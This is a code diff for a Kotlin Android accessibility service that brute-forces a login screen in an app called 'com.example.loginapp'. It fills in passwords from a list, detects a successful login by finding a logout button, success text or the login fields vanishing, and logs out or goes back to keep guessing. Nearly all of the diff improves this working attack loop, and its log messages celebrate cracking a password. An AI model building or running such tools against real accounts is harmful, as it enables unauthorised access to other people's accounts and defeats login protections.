@@ -51,32 +51,157 @@ class AutoFillAccessibilityService : AccessibilityService() {
             if (it.packageName == "com.example.loginapp") {
                 Log.d(TAG, "Login app event: ${it.eventType}")
 
-                // Check for login result changes
-                if (it.eventType == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) {
-                    checkForLoginResult()
+                // Check for login result changes or screen transitions
+                if (it.eventType == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED ||
+                    it.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
+                    checkForLoginSuccess()
                 }
             }
         }
     }
 
-    private fun checkForLoginResult() {
+    private fun checkForLoginSuccess() {
         try {
             val rootNode = rootInActiveWindow ?: return
-            val resultText = findLoginResultText(rootNode)
 
+            // Method 1: Check for success screen with logout button
+            val logoutButton = findLogoutButton(rootNode)
+            if (logoutButton != null) {
+                Log.d(TAG, "SUCCESS DETECTED! Found logout button - login was successful!")
+                isLoginSuccessful = true
+                shouldStopBruteForce = true
+                return
+            }
+
+            // Method 2: Check for result text (fallback for old behavior)
+            val resultText = findLoginResultText(rootNode)
             resultText?.let { text ->
                 Log.d(TAG, "Found result text: $text")
 
                 if (text.contains("Success", ignoreCase = true) ||
                     text.contains("Login successful", ignoreCase = true)) {
-                    Log.d(TAG, "LOGIN SUCCESSFUL! Stopping brute force.")
+                    Log.d(TAG, "SUCCESS DETECTED! Login result shows success.")
                     isLoginSuccessful = true
                     shouldStopBruteForce = true
                 }
             }
+
+            // Method 3: Check if we're no longer on the login screen
+            val loginButton = findNodeByText(rootNode, listOf("Login"))
+            val usernameField = findAllEditableNodes(rootNode).find {
+                findLabelForField(it, rootNode)?.contains("Username", ignoreCase = true) == true
+            }
+
+            // If login button and username field are gone, we might be on success screen
+            if (loginButton == null && usernameField == null) {
+                // Look for any indication this is a different screen
+                val allText = getAllTextFromNode(rootNode).lowercase()
+                if (!allText.contains("login") && !allText.contains("password") && !allText.contains("username")) {
+                    Log.d(TAG, "SUCCESS DETECTED! No longer on login screen - assuming successful login.")
+                    isLoginSuccessful = true
+                    shouldStopBruteForce = true
+                }
+            }
+
         } catch (e: Exception) {
             Log.e(TAG, "Error checking login result", e)
         }
+    }
+
+    private fun findLogoutButton(node: AccessibilityNodeInfo): AccessibilityNodeInfo? {
+        val text = node.text?.toString()?.lowercase()
+
+        // Look for logout button
+        if (text?.contains("logout") == true && node.isClickable) {
+            return node
+        }
+
+        // Search children recursively
+        for (i in 0 until node.childCount) {
+            val result = findLogoutButton(node.getChild(i))
+            if (result != null) return result
+        }
+
+        return null
+    }
+
+    private fun isOnSuccessScreen(): Boolean {
+        val rootNode = rootInActiveWindow ?: return false
+
+        // Check if we can find logout button
+        val logoutButton = findLogoutButton(rootNode)
+        if (logoutButton != null) return true
+
+        // Check if login elements are gone
+        val loginButton = findNodeByText(rootNode, listOf("Login"))
+        val editableFields = findAllEditableNodes(rootNode)
+
+        return loginButton == null && editableFields.isEmpty()
+    }
+
+    private fun returnToLoginScreen() {
+        try {
+            val rootNode = rootInActiveWindow ?: return
+
+            // Method 1: Try to find and click logout button
+            val logoutButton = findLogoutButton(rootNode)
+            if (logoutButton != null) {
+                Log.d(TAG, "Found logout button, clicking to return to login")
+                logoutButton.performAction(AccessibilityNodeInfo.ACTION_CLICK)
+                return
+            }
+
+            // Method 2: Use back button
+            Log.d(TAG, "No logout button found, using back button")
+            performGlobalAction(GLOBAL_ACTION_BACK)
+
+        } catch (e: Exception) {
+            Log.e(TAG, "Error returning to login screen", e)
+        }
+    }
+
+    private fun getAllTextFromNode(node: AccessibilityNodeInfo): String {
+        val allText = StringBuilder()
+
+        node.text?.let { allText.append(it).append(" ") }
+        node.contentDescription?.let { allText.append(it).append(" ") }
+
+        for (i in 0 until node.childCount) {
+            allText.append(getAllTextFromNode(node.getChild(i)))
+        }
+
+        return allText.toString()
+    }
+
+    private fun findLabelForField(fieldNode: AccessibilityNodeInfo, rootNode: AccessibilityNodeInfo): String? {
+        // Check the field's own properties first
+        fieldNode.text?.toString()?.let { if (it.isNotBlank()) return it }
+        fieldNode.contentDescription?.toString()?.let { if (it.isNotBlank()) return it }
+        fieldNode.hintText?.toString()?.let { if (it.isNotBlank()) return it }
+
+        // Check parent for label
+        fieldNode.parent?.let { parent ->
+            findTextInNode(parent, fieldNode)?.let { return it }
+        }
+
+        return null
+    }
+
+    private fun findTextInNode(node: AccessibilityNodeInfo, excludeNode: AccessibilityNodeInfo?): String? {
+        if (node == excludeNode) return null
+
+        node.text?.toString()?.let {
+            if (it.isNotBlank() && !it.equals(excludeNode?.text?.toString())) return it
+        }
+
+        for (i in 0 until node.childCount) {
+            val child = node.getChild(i)
+            if (child != excludeNode) {
+                findTextInNode(child, excludeNode)?.let { return it }
+            }
+        }
+
+        return null
     }
 
     private fun findLoginResultText(node: AccessibilityNodeInfo): String? {
@@ -133,16 +258,24 @@ class AutoFillAccessibilityService : AccessibilityService() {
                     fillLoginForm(ipAddress, username, password)
 
                     // Wait and check for success before continuing
-                    delay(2000) // Wait for login response
+                    delay(3000) // Increased wait time for screen transition
 
                     if (shouldStopBruteForce) {
-                        Log.d(TAG, "SUCCESS! Password '$password' worked!")
+                        Log.d(TAG, "🎉 BREAKTHROUGH! Password '$password' cracked the system!")
                         return@launch
                     }
 
                     // Wait before next attempt (if not the last one)
                     if (index < passwords.size - 1) {
-                        Log.d(TAG, "Password '$password' failed, trying next...")
+                        Log.d(TAG, "❌ Password '$password' rejected, moving to next target...")
+
+                        // If we're on success screen, need to go back to login
+                        if (isOnSuccessScreen()) {
+                            Log.d(TAG, "Detected success screen, returning to login...")
+                            returnToLoginScreen()
+                            delay(2000) // Wait for login screen to load
+                        }
+
                         delay(1000) // Wait before next attempt
                     }
                 }
